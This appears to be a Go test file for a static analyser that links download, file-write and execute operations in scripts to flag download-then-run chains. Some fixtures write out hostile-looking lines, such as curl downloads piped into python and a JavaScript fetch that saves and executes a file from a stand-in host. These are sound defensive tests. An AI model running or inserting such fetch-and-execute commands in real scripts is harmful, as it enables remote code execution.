	t.Run("unproved", func(t *testing.T) {
		var graph behavior.Graph
		download := newOperation(behavior.OperationNetworkDownload, 1)
		exec := newOperation(behavior.OperationProcessExecute, 2)
		download.SourceOrderGroup, download.SourceOrdinal = 0, 0
		exec.SourceOrderGroup, exec.SourceOrdinal = 0, 0
		graph.AddOperation(download)
		graph.AddOperation(exec)
		linkTestOperationRelations(&graph)
		if len(graph.Relations) != 0 {
			t.Fatalf("graph append order became source order: %#v", graph.Relations)
		}
	})
}

func TestLinkOperationRelationsRejectsReverseSameLineJavaScriptExtractorOrder(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:           "node-script",
		ScopeID:          "scope-script",
		LogicalPath:      "reverse.js",
		SemanticLanguage: "javascript",
		Data: []byte(
			`const child_process = require("child_process"); ` +
				`child_process.execFileSync("/tmp/reverse"); ` +
				`fs.writeFileSync("/tmp/reverse", await fetch("https://example.invalid/reverse").then(r => r.arrayBuffer()))`,
		),
	})

	LinkOperationRelations(&graph)

	if len(graph.Relations) != 0 {
		t.Fatalf("analyzer emission order reversed same-line JavaScript source: %#v", graph.Relations)
	}
}

func TestLinkOperationRelationsUsesLatestProvenSameLineDownload(t *testing.T) {
	var graph behavior.Graph
	AnalyzeShellLine(
		&graph,
		artifact.Content{NodeID: "node-script", ScopeID: "scope-script", LogicalPath: "install.sh"},
		`curl -o /tmp/p https://example.invalid/first; curl -o /tmp/p https://example.invalid/second; python /tmp/p`,
		1,
		testConnectedExecution("root-script"),
		"ev-line",
	)

	LinkOperationRelations(&graph)

	var downloads []behavior.ModeledOperation
	var execute behavior.ModeledOperation
	for _, operation := range graph.Operations {
		switch operation.Kind {
		case behavior.OperationNetworkDownload:
			downloads = append(downloads, operation)
		case behavior.OperationInterpreterInvoke:
			execute = operation
		}
	}
	if len(downloads) != 2 || execute.ID == "" {
		t.Fatalf("fixture operations = %#v", graph.Operations)
	}
	if !hasRelationBetween(graph.Relations, behavior.RelationPrecedes, downloads[1].ID, execute.ID) {
		t.Fatalf("latest same-line download was not related to its consumer: %#v", graph.Relations)
	}
	if hasRelationBetween(graph.Relations, behavior.RelationPrecedes, downloads[0].ID, execute.ID) {
		t.Fatalf("overwritten same-line download was related to the consumer: %#v", graph.Relations)
	}
}

func TestLinkOperationRelationsRejectsDownloadOverwrittenByOtherProducer(t *testing.T) {
	for _, writerKind := range []behavior.OperationKind{
		behavior.OperationArchiveCreate,
		behavior.OperationDirectoryCreate,
		behavior.OperationFileCopy,
		behavior.OperationFileDelete,
		behavior.OperationFileMove,
		behavior.OperationFileWrite,
		behavior.OperationPlistModify,
		behavior.OperationScreenCapture,
		behavior.OperationShellProfileModify,
	} {
		t.Run(string(writerKind), func(t *testing.T) {
			var graph behavior.Graph
			graph.AddOperation(behavior.ModeledOperation{
				SubjectNodeID: "node-script",
				ScopeID:       "scope-script",
				Kind:          behavior.OperationNetworkDownload,
				ResourceBindings: behavior.Bindings(
					behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/payload")),
					behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, "https://example.invalid/payload")),
				),
				Execution: testConnectedExecution("root-script"),
				Line:      1,
			})
			writerBindings := invalidatingOperationBindings(writerKind, "/tmp/payload")
			graph.AddOperation(behavior.ModeledOperation{
				SubjectNodeID:    "node-script",
				ScopeID:          "scope-script",
				Kind:             writerKind,
				ResourceBindings: writerBindings,
				Execution:        testConnectedExecution("root-script"),
				Line:             2,
			})
			graph.AddOperation(behavior.ModeledOperation{
				SubjectNodeID: "node-script",
				ScopeID:       "scope-script",
				Kind:          behavior.OperationProcessExecute,
				ResourceBindings: behavior.Bindings(
					behavior.Bind(behavior.ResourceRoleExecutable, behavior.NewResource(behavior.ResourceFile, "/tmp/payload")),
				),
				Execution: testConnectedExecution("root-script"),
				Line:      3,
			})

			linkTestOperationRelations(&graph)

			if len(graph.Relations) != 0 {
				t.Fatalf("%s replacement was still attributed to the earlier download: %#v", writerKind, graph.Relations)
			}
		})
	}
}

func invalidatingOperationBindings(kind behavior.OperationKind, target string) []behavior.ResourceBinding {
	switch kind {
	case behavior.OperationArchiveCreate, behavior.OperationFileWrite:
		return behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, target)))
	case behavior.OperationFileCopy:
		return behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, target)),
			behavior.Bind(behavior.ResourceRoleSource, behavior.NewResource(behavior.ResourceFile, "/tmp/replacement")),
		)
	case behavior.OperationScreenCapture:
		return behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, target)),
			behavior.Bind(behavior.ResourceRoleSource, behavior.NewResource(behavior.ResourceScreen, "")),
		)
	case behavior.OperationFileMove:
		return behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleSource, behavior.NewResource(behavior.ResourceFile, "/tmp/replacement")),
			behavior.Bind(behavior.ResourceRoleTarget, behavior.NewResource(behavior.ResourceFile, target)),
		)
	default:
		return behavior.Bindings(behavior.Bind(behavior.ResourceRoleTarget, behavior.NewResource(behavior.ResourceFile, target)))
	}
}

func TestLinkOperationRelationsInvalidatesFileMoveSourceIdentity(t *testing.T) {
	for _, moveTarget := range []string{"/tmp/relocated", ""} {
		var graph behavior.Graph
		graph.AddOperation(behavior.ModeledOperation{
			SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationNetworkDownload,
			ResourceBindings: behavior.Bindings(
				behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/payload")),
				behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, "https://example.invalid/payload")),
			),
			Execution: testConnectedExecution("root-script"), Line: 1,
		})
		graph.AddOperation(behavior.ModeledOperation{
			SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationFileMove,
			ResourceBindings: behavior.Bindings(
				behavior.Bind(behavior.ResourceRoleSource, behavior.NewResource(behavior.ResourceFile, "/tmp/payload")),
				behavior.Bind(behavior.ResourceRoleTarget, behavior.NewResource(behavior.ResourceFile, moveTarget)),
			),
			Execution: testConnectedExecution("root-script"), Line: 2,
		})
		graph.AddOperation(behavior.ModeledOperation{
			SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationProcessExecute,
			ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.NewResource(behavior.ResourceFile, "/tmp/payload"))),
			Execution:        testConnectedExecution("root-script"), Line: 3,
		})

		linkTestOperationRelations(&graph)

		if len(graph.Relations) != 0 {
			t.Fatalf("move to %q left stale download-to-execute lineage: %#v", moveTarget, graph.Relations)
		}
	}
}

func TestLinkOperationRelationsPreservesRepeatedSameTargetPaths(t *testing.T) {
	var graph behavior.Graph
	for _, line := range []int{1, 3} {
		graph.AddOperation(behavior.ModeledOperation{
			SubjectNodeID: "node-script",
			Kind:          "network.download", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"}), behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, ""))), ScopeID: "scope-script", Execution: testConnectedExecution("root-script"),
			Line: line,
		})
		graph.AddOperation(behavior.ModeledOperation{
			SubjectNodeID: "node-script",
			Kind:          "process.execute", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"})), ScopeID: "scope-script", Execution: testConnectedExecution("root-script"),
			Line: line + 1,
		})
	}

	linkTestOperationRelations(&graph)

	if len(graph.Relations) != 6 {
		t.Fatalf("expected both repeated same-target paths to be preserved: %#v", graph.Relations)
	}
}

func TestLinkOperationRelationsBoundsCandidateWorkWithPartialCoverage(t *testing.T) {
	var graph behavior.Graph
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script",
		Kind:          "network.download", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"}), behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, ""))), ScopeID: "scope-script", Execution: testConnectedExecution("root-script"),
		Line: 1,
	})
	for i := 0; i < 3; i++ {
		graph.AddOperation(behavior.ModeledOperation{
			SubjectNodeID: "node-script",
			Kind:          "process.execute", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"})), ScopeID: "scope-script", Execution: testConnectedExecution("root-script"),
			Line: 2 + i,
		})
	}

	linkTestOperationRelationsWithBudget(&graph, 2)

	if len(graph.Relations) != 5 {
		t.Fatalf("candidate budget should retain the relations for a deterministic two-path prefix: %#v", graph.Relations)
	}
	if !hasPartialCoverageScope(graph.Coverage, "operation-relation-linking") {
		t.Fatalf("candidate truncation must be visible in coverage: %#v", graph.Coverage)
	}
}

func TestLinkOperationRelationsBoundsCombinedEvidence(t *testing.T) {
	var graph behavior.Graph
	evidence := make([]string, behavior.MaxRelationEvidenceIDs*2)
	for index := range evidence {
		evidence[index] = fmt.Sprintf("ev-%04d", index)
	}
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationNetworkDownload,
		ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/payload")),
			behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, "https://example.invalid/payload")),
		),
		EvidenceIDs: evidence, Support: behavior.SupportDirect, Execution: testConnectedExecution("root-script"), Line: 1,
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationProcessExecute,
		ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.NewResource(behavior.ResourceFile, "/tmp/payload"))),
		EvidenceIDs:      evidence, Support: behavior.SupportDirect, Execution: testConnectedExecution("root-script"), Line: 2,
	})

	linkOperationRelations(&graph, maxOperationRelationLinkWork)

	if len(graph.Relations) != 3 {
		t.Fatalf("bounded evidence prevented relation emission: %#v", graph.Relations)
	}
	for _, relation := range graph.Relations {
		if len(relation.EvidenceIDs) != behavior.MaxRelationEvidenceIDs {
			t.Fatalf("relation evidence count = %d, want %d: %#v", len(relation.EvidenceIDs), behavior.MaxRelationEvidenceIDs, relation)
		}
	}
}

func TestLinkOperationRelationsRetainsEvidenceFromBothEndpointsAtCap(t *testing.T) {
	var graph behavior.Graph
	leftEvidence := make([]string, behavior.MaxRelationEvidenceIDs)
	rightEvidence := make([]string, behavior.MaxRelationEvidenceIDs)
	for index := 0; index < behavior.MaxRelationEvidenceIDs; index++ {
		leftEvidence[index] = fmt.Sprintf("ev-left-%04d", index)
		rightEvidence[index] = fmt.Sprintf("ev-right-%04d", index)
	}
	leftID := graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationNetworkDownload,
		ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/payload")),
			behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, "https://example.invalid/payload")),
		),
		EvidenceIDs: leftEvidence, Support: behavior.SupportDirect, Execution: testConnectedExecution("root-script"), Line: 1,
	})
	rightID := graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationProcessExecute,
		ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.NewResource(behavior.ResourceFile, "/tmp/payload"))),
		EvidenceIDs:      rightEvidence, Support: behavior.SupportDirect, Execution: testConnectedExecution("root-script"), Line: 2,
	})

	linkOperationRelations(&graph, maxOperationRelationLinkWork)

	var precedes *behavior.OperationRelation
	for index := range graph.Relations {
		relation := &graph.Relations[index]
		if relation.Kind == behavior.RelationPrecedes && relation.From.ID == leftID && relation.To.ID == rightID {
			precedes = relation
			break
		}
	}
	if precedes == nil {
		t.Fatalf("bounded two-endpoint proof prevented PRECEDES emission: %#v", graph.Relations)
		return
	}
	if len(precedes.EvidenceIDs) != behavior.MaxRelationEvidenceIDs ||
		!containsString(precedes.EvidenceIDs, leftEvidence[0]) ||
		!containsString(precedes.EvidenceIDs, rightEvidence[0]) {
		t.Fatalf("PRECEDES evidence did not retain a proof from both endpoints: %#v", precedes.EvidenceIDs)
	}
	if graph.InvalidItemsDropped != 0 {
		t.Fatalf("valid bounded relation was misreported as invalid: dropped=%d", graph.InvalidItemsDropped)
	}
}

func TestLinkOperationRelationsSurvivesEvidenceCountExhaustion(t *testing.T) {
	graph := behavior.Graph{EvidenceLimit: 1}
	evidenceID := graph.AddEvidence(behavior.Evidence{NodeID: "node-script", Kind: "text-line", Value: "retained"})
	if evidenceID == "" || !graph.EvidenceLimitReached() {
		t.Fatal("test did not exhaust the evidence-count budget")
	}
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationNetworkDownload,
		ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/payload")),
			behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, "https://example.invalid/payload")),
		),
		EvidenceIDs: []string{evidenceID}, Support: behavior.SupportDirect, Execution: testConnectedExecution("root-script"), Line: 1,
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationProcessExecute,
		ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.NewResource(behavior.ResourceFile, "/tmp/payload"))),
		EvidenceIDs:      []string{evidenceID}, Support: behavior.SupportDirect, Execution: testConnectedExecution("root-script"), Line: 2,
	})

	LinkOperationRelations(&graph)

	if len(graph.Relations) != 3 {
		t.Fatalf("evidence-count exhaustion blocked retained-fact relations: %#v", graph.Relations)
	}
}

func linkTestOperationRelations(graph *behavior.Graph) {
	linkTestOperationRelationsWithBudget(graph, maxOperationRelationLinkWork)
}

func linkTestOperationRelationsWithBudget(graph *behavior.Graph, workLimit int) {
	for index := range graph.Operations {
		if len(graph.Operations[index].EvidenceIDs) == 0 {
			graph.Operations[index].EvidenceIDs = []string{"ev-operation"}
		}
		if graph.Operations[index].Support == "" {
			graph.Operations[index].Support = behavior.SupportDirect
		}
	}
	LinkDirectCalls(graph)
	linkOperationRelations(graph, workLimit)
}

func hasRelationKind(relations []behavior.OperationRelation, kind behavior.RelationKind) bool {
	for _, relation := range relations {
		if relation.Kind == kind {
			return true
		}
	}
	return false
}

func hasRelationBetween(relations []behavior.OperationRelation, kind behavior.RelationKind, from, to string) bool {
	for _, relation := range relations {
		if relation.Kind == kind && relation.From.ID == from && relation.To.ID == to {
			return true
		}
	}
	return false
}

func countRelationKind(relations []behavior.OperationRelation, kind behavior.RelationKind) int {
	count := 0
	for _, relation := range relations {
		if relation.Kind == kind {
			count++
		}
	}
	return count
}

func hasOperationFlowRelation(relations []behavior.OperationRelation) bool {
	return hasRelationKind(relations, behavior.RelationPipesTo) || hasRelationKind(relations, behavior.RelationPrecedes)
}

func hasPartialCoverageScope(coverage []behavior.Coverage, scope string) bool {
	for _, item := range coverage {
		if item.AnalysisArea == scope && item.Status == "partial" {
			return true
		}
	}
	return false
}

func testConnectedExecution(rootID string) behavior.ExecutionContext {
	return behavior.ExecutionContext{
		Connectivity:     behavior.ConnectivityConnected,
		ExecutionRootIDs: []string{rootID},
	}
}
